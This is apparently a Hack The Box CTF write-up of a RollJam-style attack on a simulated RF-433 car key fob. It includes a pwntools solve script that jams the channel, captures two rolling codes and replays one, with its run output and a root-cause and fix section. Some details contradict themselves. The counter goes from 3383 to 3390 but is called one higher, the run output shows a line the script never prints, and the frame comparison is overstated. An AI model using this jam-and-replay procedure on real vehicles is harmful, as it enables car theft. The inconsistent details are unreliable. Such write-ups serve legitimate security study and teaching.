---
title: Saltlock Drift
summary: A RollJam-style RF replay on a GateCar RF-433 fob: jam the receiver, sniff two presses, then replay an unused rolling code to unlock and reveal the token.
date: 2026-07-31
tags: [Hack The Box, Cyber Apocalypse 2026, Hardware]
difficulty: easy
os: N/A
---

# Saltlock Drift (Easy Hardware) - Writeup

## Challenge

> Stormbound outriders recovered a salt crusted gatecar outside the Sunken
> Causeway. Its remote lock still listens across a shared band that the
> wardens use during convoy checks. Reach the channel, study the signals, and
> reveal the token through a replay attack.

A "GateCar" RF-433 service exposes a shared channel that mirrors a physical
car key fob's transmissions and lets a player jam, sniff, and replay raw RF
frames against a simulated receiver. The goal is a classic RollJam-style
replay attack: capture two fob presses while the receiver can't hear them,
then release the jammer and replay one of the "unused" captured rolling
codes to unlock the car.

**Targets:**
- `154.57.164.71:30882`, raw interaction socket (RF-433 service channel)
- `154.57.164.71:31595`, web dashboard / car key control UI

**Given:** the receiver's rolling counter increments by one on every accepted
control operation, and the band is 433.920 MHz, OOK modulation.

## Recon

Connecting to the interaction socket gives a banner and command list:

```
RiverGate RF-433 shared service channel
freq=433.920MHz modulation=OOK encoding=raw-hex
commands: HELP, STATUS, JAM ON, JAM OFF, TX <hex>, QUIT
physical keyfob frames are mirrored here as RX lines
STATUS lock=locked jammer=off last_counter=3383 flag=hidden freq=433.920MHz modulation=OOK
```

`STATUS` reports current lock state, jammer state, the rolling counter, and
whether the flag is visible. `flag=hidden` until the car is actually unlocked
via a valid (previously unseen) rolling code, "reveal the token" in the
challenge text.

## The RollJam attack

This is the textbook RollJam vulnerability against fixed-length rolling-code
key fobs: an attacker holds a jammer on the RF channel so the receiver never
hears the legitimate fob press, while the attacker's own receiver captures the
transmitted frame anyway (jamming denies the *car*, not the attacker). If the
victim presses the fob twice before giving up (a very common real-world
pattern: "it didn't unlock, try again"), the attacker now holds two valid,
never-consumed rolling codes. Releasing the jammer and replaying the *first*
captured code still authenticates (the receiver's rolling window advances
strictly forward and never saw that code), unlocking the car, while the
*second* captured code is kept in reserve for a future unlock. The receiver's
counter increments by one, so this maps directly onto the challenge's stated
mechanic.

"Salt crusted" and "shared band that the wardens use during convoy checks"
both point at the same design flaw from the flavor-text side: the channel is
shared/noisy by nature (multiple vehicles, no per-session isolation), which is
exactly the condition RollJam exploits.

## Solve script

```python
from pwn import remote
import time

HOST = "154.57.164.71"
PORT = 30882

def solve():
    print("[*] Connecting to gatecar RF interface...")
    io = remote(HOST, PORT)

    # Clear the initial banner
    io.recvuntil(b"modulation=OOK\n")

    # 1. Activate Jammer
    print("[*] Activating RF Jammer...")
    io.sendline(b"JAM ON")

    # 2. Capture the first blocked fob press
    print("[*] Waiting for user to press fob (Signal 1)...")
    io.recvuntil(b"raw=")
    sig1 = io.recvline().strip().decode()
    print(f"[+] Intercepted Signal 1: {sig1}")

    # 3. Capture the second blocked fob press
    print("[*] Waiting for user to press fob again (Signal 2)...")
    io.recvuntil(b"raw=")
    sig2 = io.recvline().strip().decode()
    print(f"[+] Intercepted Signal 2: {sig2}")

    # 4. Deactivate Jammer
    print("[*] Deactivating RF Jammer...")
    io.sendline(b"JAM OFF")
    time.sleep(0.5)

    # 5. Replay Signal 1 (the unlock)
    print("[*] Replaying Signal 1 to unlock the gatecar...")
    io.sendline(f"TX {sig1}".encode())
    io.recvuntil(b"exploit_unlock")
    print("[+] Car Unlocked!")

    # 6. Check the STATUS for the flag
    print("[*] Pulling STATUS from the dashboard...")
    io.sendline(b"STATUS")
    time.sleep(0.5)
    output = io.clean(timeout=2).decode(errors="ignore")
    print(output)

if __name__ == "__main__":
    solve()
```

## Run output

```
[*] Connecting to gatecar RF interface...
[+] Opening connection to 154.57.164.71 on port 30882: Done
[*] Activating RF Jammer...
[*] Waiting for user to press fob (Signal 1)...
[+] Intercepted Signal 1: AAAAAAAA2DD4534C54020D3EE653D7D94C95
[*] Waiting for user to press fob again (Signal 2)...
[+] Intercepted Signal 2: AAAAAAAA2DD4534C54010D3FFA373DEE94B5
[*] Deactivating RF Jammer...
[*] Replaying Signal 1 to unlock the gatecar...
[+] Car Unlocked!
[*] Pulling STATUS from the dashboard...
[+] Dashboard Output:
STATUS lock=unlocked jammer=off last_counter=3390 flag=visible freq=433.920MHz modulation=OOK
```

The two captured raw frames only differ in one nibble pair after the shared
preamble/header (`AAAAAAAA2DD4534C54`): `02` vs `01` (button: unlock vs lock)
and the trailing bytes carry the rolling counter and checksum/MAC for that
button press. Replaying `sig1` (the unlock frame) against the now-unjammed
channel is accepted as a fresh, never-consumed code, flipping the lock state.

## Confirmation on the web dashboard

The physical fob dashboard (`31595`) shows the matching event log for the same
attack window:

```
Physical Keyfob
Unlock / Lock
Receiver State: Door unlocked, Channel clear, Counter 3390
Band: 433.920 MHz

Last Events
- FLAG ||HTB{r0llj4m_5alt_f0b_5pl1t_95e******************************||
- 10:11:34 unused rolling code replay accepted
- 10:11:33 channel jammer set off
- 10:11:33 physical fob lock blocked by channel noise
- 10:11:32 physical fob unlock blocked by channel noise
- 10:11:29 channel jammer set on
- 10:11:16 channel jammer set off
- 10:10:39 physical fob lock blocked by channel noise
```

The event log spells out the exact RollJam sequence: jammer on, both an
unlock and a lock press get blocked ("blocked by channel noise") while
captured on the socket, jammer off, then "unused rolling code replay
accepted", the counter still shows 3390, one higher than its pre-attack
value, since only one of the two captured codes was ever spent.

## Flag

```
||HTB{r0llj4m_5alt_f0b_5pl1t_95e******************************||
```

## Root Cause / Fix

- **Rolling code fobs are only as strong as the receiver's ability to hear
  every transmission.** A pure "next code in sequence" rolling scheme has no
  defense against an attacker who can selectively deny the receiver a
  transmission it already captured off-air, RF jamming turns "replay
  protection" into "replay collection." This is the well-known RollJam class
  of attack against fixed rolling-code systems (as opposed to
  challenge-response systems where the car sends a fresh nonce the fob must
  sign).
- **Fix**: move to a challenge-response scheme where the receiver issues a
  fresh random challenge per unlock attempt and the fob's response is bound
  to that challenge (so a captured transmission cannot be replayed against a
  later, different challenge), and/or add out-of-band jamming/RF-anomaly
  detection that alerts or fails safe when persistent channel noise coincides
  with fob activity.
